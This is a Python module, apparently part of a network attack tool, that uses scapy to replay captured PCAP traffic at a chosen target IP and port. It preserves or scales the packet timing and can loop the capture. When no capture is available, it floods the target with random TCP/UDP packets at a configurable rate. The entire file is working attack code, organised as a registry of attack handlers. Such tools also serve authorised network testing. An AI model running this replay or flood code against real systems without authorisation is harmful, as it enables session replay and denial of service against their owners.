"""
Replay attack module — replay captured traffic from PCAP files.
"""

from __future__ import annotations

import logging
import time

from scapy.all import rdpcap, send, conf

log = logging.getLogger(__name__)

conf.verb = 0

HANDLERS = {}


def _register(name):
    def decorator(fn):
        HANDLERS[name] = fn
        return fn
    return decorator


def run_attack(
    sub_type: str,
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    handler = HANDLERS.get(sub_type)
    if handler is None:
        raise ValueError(f"Unknown replay sub_type: {sub_type!r}")
    return handler(target_ip, target_port, duration, rate_multiplier, params)


# ── PCAP Replay ──────────────────────────────────────────

@_register("pcap_replay")
def pcap_replay(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """
    Replay packets from a PCAP file.

    If the PCAP file doesn't exist, generate synthetic replay traffic
    (random TCP/UDP packets mimicking captured patterns).
    """
    pcap_path = params.get("pcap_path", "/data/captures/sample.pcap")
    loop_count = params.get("loop", 1)
    speed = params.get("speed", 1.0) * rate_multiplier

    log.info("PCAP replay: %s → %s (loops=%d, speed=%.1fx)", pcap_path, target_ip, loop_count, speed)

    try:
        packets = rdpcap(pcap_path)
        log.info("Loaded %d packets from %s", len(packets), pcap_path)
    except Exception as exc:
        log.warning("Cannot read PCAP %s (%s), generating synthetic replay", pcap_path, exc)
        return _synthetic_replay(target_ip, target_port, duration, rate_multiplier, params)

    packets_sent = 0
    deadline = time.time() + duration

    for loop in range(loop_count):
        if time.time() >= deadline:
            break

        prev_time = None
        for pkt in packets:
            if time.time() >= deadline:
                break

            # Preserve inter-packet timing (scaled by speed)
            if prev_time is not None and hasattr(pkt, "time"):
                delta = float(pkt.time - prev_time)
                if delta > 0 and speed > 0:
                    time.sleep(delta / speed)
            if hasattr(pkt, "time"):
                prev_time = pkt.time

            try:
                send(pkt, verbose=False)
                packets_sent += 1
            except Exception:
                pass

    return {
        "packets_sent": packets_sent,
        "attack": "pcap_replay",
        "pcap_path": pcap_path,
        "loops_completed": loop + 1 if loop_count > 0 else 0,
    }


def _synthetic_replay(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """Fallback: generate synthetic TCP/UDP replay-like traffic."""
    from scapy.all import IP, TCP, UDP, Raw, RandShort, RandString
    import random

    pps = int(100 * rate_multiplier)
    log.info("Synthetic replay → %s:%d at ~%d pps", target_ip, target_port, pps)

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        # Mix of TCP and UDP to simulate captured traffic
        if random.random() < 0.6:
            pkt = (
                IP(dst=target_ip) /
                TCP(sport=RandShort(), dport=target_port, flags="PA") /
                Raw(load=RandString(size=random.randint(20, 200)))
            )
        else:
            pkt = (
                IP(dst=target_ip) /
                UDP(sport=RandShort(), dport=target_port) /
                Raw(load=RandString(size=random.randint(20, 200)))
            )
        send(pkt, verbose=False)
        packets_sent += 1
        time.sleep(1.0 / max(pps, 1))

    return {
        "packets_sent": packets_sent,
        "attack": "synthetic_replay",
        "note": "PCAP not available, used synthetic traffic",
    }
